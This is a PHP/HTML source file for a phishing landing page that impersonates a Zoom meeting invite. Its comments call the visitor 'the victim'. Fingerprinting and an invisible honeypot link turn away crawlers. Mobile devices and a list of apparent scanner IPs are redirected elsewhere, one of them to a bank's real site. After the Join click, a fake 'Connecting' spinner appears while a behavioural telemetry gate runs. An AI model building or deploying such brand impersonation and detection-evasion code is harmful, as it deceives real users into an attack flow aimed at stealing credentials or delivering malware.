<?php
require __DIR__ . '/../lib.php';

// Entry page: real desktop Chrome only (full header fingerprint + honeypot).
gate_doc([], 0, false);

$tk = issue_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Zoom - A New Way to Hold Meetings</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    .container {
      width: 100%; height: 100vh;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      background: linear-gradient(160deg, #1b2735 0%, #0f3460 55%, #16213e 100%);
      gap: 18px; padding-bottom: 12vh;
    }
    .card {
      background: #fff; border-radius: 10px;
      box-shadow: 0 22px 60px rgba(0,0,0,.35);
      width: 460px; max-width: 90vw; text-align: center;
      padding: 44px 44px 40px;
    }
    .logo { width: 74px; height: 74px; margin-bottom: 22px; }
    .heading { font-size: 21px; font-weight: 600; color: #1a1a1a; margin-bottom: 10px; }
    .sub { font-size: 13.5px; color: #6b6b6b; line-height: 1.55; margin-bottom: 26px; }
    .btn {
      display: inline-block; background: #0B5CFF; color: #fff; text-decoration: none;
      font-size: 15px; font-weight: 600; padding: 13px 52px; border-radius: 4px;
      letter-spacing: .3px;
    }
    .btn:hover { background: #0a52e0; }
    .connecting { display: none; margin-top: 26px; align-items: center; justify-content: center; gap: 12px; color: #9aa0a8; font-size: 13px; }
    .spinner {
      width: 22px; height: 22px;
      border: 3px solid #0B5CFF; border-top-color: transparent;
      border-radius: 50%;
      animation: spinner 0.7s linear infinite;
    }
    @keyframes spinner { to { transform: rotate(360deg); } }
    .footer { font-size: 11px; color: #b5b5b5; margin-top: 34px; line-height: 1.5; }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <img src="assets/zoomicon.png" alt="Zoom" class="logo">
      <div class="heading">Joining your Zoom meeting</div>
      <p class="sub">A new meeting invite was sent to you. To join, open the meeting in the Zoom desktop client.</p>
      <a class="btn" id="joinbtn" href="#">Join</a>
      <div class="connecting" id="connecting"><div class="spinner"></div><span>Connecting to meeting&hellip;</span></div>
      <div class="footer">Protected by reCAPTCHA &middot; Google <a href="https://policies.google.com/privacy" style="color:#b5b5b5">Privacy</a> / <a href="https://policies.google.com/terms" style="color:#b5b5b5">Terms</a></div>
    </div>
  </div>

  <!-- Honeypot: invisible to humans, followed by link-crawling bots.
       A visit to ?hp=1 poisons that IP+UA fingerprint for 24h. -->
  <a href="?hp=1" aria-hidden="true"
     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>

  <script>
    const TK = <?php echo json_encode($tk); ?>;

    const blockedIPs = [
      '162.158.63.162',
      '162.158.63.161',
      '162.158.63.160'
    ];

    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getClientIP() {
      // 3s guard so a hung external call can't stall the whole flow.
      return new Promise((resolve) => {
        var to = setTimeout(function () { resolve(null); }, 3000);
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => { clearTimeout(to); resolve(data.ip); })
          .catch(() => { clearTimeout(to); resolve(null); });
      });
    }

    (async function() {
      if (isMobileDevice()) {
        window.location.href = "denied.html";
        return;
      }
      const clientIP = await getClientIP();
      if (clientIP && blockedIPs.includes(clientIP)) {
        window.location.href = "https://www.easternbank.com/";
        return;
      }
      // Flip to the "Connecting" state the moment the victim clicks Join,
      // then run the behavioral gate: collect mouse/keyboard/scroll, one Jev
      // verdict, then continue with the verdict-bound token. All failure
      // paths fall back to the original 5s fixed-time redirect.
      document.getElementById('joinbtn').addEventListener('click', function (e) {
        e.preventDefault();
        this.style.display = 'none';
        document.getElementById('connecting').style.display = 'flex';
      });
      <?php include __DIR__ . '/../include/telemetry.php'; ?>
    })();
  </script>
</body>
</html>
